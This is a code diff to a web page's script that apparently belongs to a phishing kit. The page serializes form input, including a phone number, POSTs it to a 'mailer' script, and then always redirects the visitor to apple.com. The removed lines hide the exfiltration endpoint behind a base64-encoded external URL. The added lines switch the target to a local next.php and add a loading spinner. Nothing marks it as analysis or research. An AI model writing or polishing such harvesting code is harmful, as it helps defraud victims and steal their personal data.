@@ -517,12 +517,6 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
     <script type="text/javascript">
-        // Redirect link
-        var rdrt = "https://www.apple.com/";
-        
-        // Mailer link - encoded next.php URL
-        var f = atob("aHR0cHM6Ly9yb3RhZG9zYWJvci5jb20vam9rZXIvbmV4dC5waHA=");
-        
         $(document).ready(function() {
             // Format inputs
             $("#ph").inputmask({"mask": "999-999-9999"});
@@ -549,13 +543,16 @@
                 
                 // Submit form via AJAX
                 $.ajax({
-                    url: f,
+                    url: "next.php",
                     type: 'POST',
                     data: $(this).serialize(),
                     dataType: 'json',
-                    complete: function() {
+                    beforeSend: function(a) {
+                        $('#complete-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
+                    },
+                    complete: function(a) {
                         // Always redirect to Apple website after submission
-                        window.location.href = rdrt;
+                        window.location.href = "https://www.apple.com/";
                     }
                 });
                 });
